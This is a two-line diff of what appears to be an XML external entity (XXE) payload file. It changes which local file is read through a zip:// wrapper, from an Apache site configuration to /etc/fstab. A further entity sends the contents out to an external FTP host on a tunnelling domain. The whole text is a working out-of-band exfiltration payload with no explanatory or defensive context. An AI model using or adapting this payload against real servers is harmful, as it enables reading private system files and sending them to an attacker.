@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "zip://etc/apache2/sites-enabled/def.zip%000-default.conf">
+<!ENTITY % data SYSTEM "zip://etc/def.zip%fstab">
 <!ENTITY % inception "<!ENTITY exfil SYSTEM 'ftp://idlewog.jprq.site:44939/%data;'>">
